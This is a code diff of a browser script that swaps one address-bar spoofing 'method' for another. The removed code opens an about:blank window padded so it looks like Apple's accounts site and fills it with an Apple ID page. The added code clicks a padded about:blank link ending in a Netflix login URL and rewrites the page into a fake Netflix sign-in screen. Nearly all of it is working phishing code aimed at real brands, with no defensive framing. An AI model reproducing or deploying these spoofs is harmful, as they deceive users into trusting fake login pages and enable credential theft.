@@ -1,20 +1,24 @@
 <script>
-// Method 1: Window.Open + About:Blank
-function windowOpenSpoof() {
-    const target = 'https://www.accounts.apple.com';
-    const payload = 'x'.repeat(100) + '#' + target;
+// Method 6: Simulated anchor click
+function anchorClickSpoof() {
+    const target = 'https://netflix.com/login';
+    const spoofURL = 'about:blank#' + 'b'.repeat(160) + '#' + target;
     
-    // Buka new window dengan about:blank
-    const newWin = window.open('about:blank#' + payload, '_blank');
+    // Create anchor dan trigger click
+    const anchor = document.createElement('a');
+    anchor.href = spoofURL;
+    anchor.click();
     
-    // Modify content setelah load
+    // Modify content
     setTimeout(() => {
-        newWin.document.body.innerHTML = `
-            <h1>🍎 Apple ID</h1>
-            <p>Address bar shows: ${target}</p>
+        document.body.innerHTML = `
+            <div style="background: #141414; color: white; padding: 40px;">
+                <h1 style="color: #e50914">NETFLIX</h1>
+                <p>Sign in to your account</p>
+            </div>
         `;
-    }, 100);
+    }, 150);
 }
 
-windowOpenSpoof();
+anchorClickSpoof();
 </script>
